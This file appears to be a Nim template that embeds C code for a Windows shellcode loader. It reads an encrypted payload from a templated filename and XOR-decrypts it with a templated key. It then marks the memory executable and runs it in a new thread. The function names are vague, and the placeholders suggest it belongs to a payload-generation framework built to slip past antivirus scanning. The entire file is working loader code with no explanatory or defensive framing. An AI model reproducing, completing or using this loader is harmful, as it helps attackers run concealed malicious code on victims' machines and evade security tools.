{.emit: """

#include "windows.h"
#include <stdio.h>

#pragma warning(disable:4996)

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
    int j = 0;

    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;

        data[i] = data[i] ^ key[j];
        j++;
    }
}

int x2Ldrx() {

	FILE* fp;
	BOOL rv;
	HANDLE th;
	SIZE_T size;
	void* exec_mem;
	DWORD oldprotect = 0;

	char key[] = { {{Key}} };

	fp = fopen("{{LOCAL_FILENAME}}", "rb");
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, 0, SEEK_SET);
	exec_mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	fread(exec_mem, size, 1, fp);
	XOR((char*)exec_mem, size, key, sizeof(key));

	rv = VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &oldprotect);
	th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
	WaitForSingleObject(th, -1);

	return 0;
}
""".}
proc x2Ldr(): int
    {.importc: "x2Ldrx", nodecl.}

when isMainModule:
    var result = x2Ldr()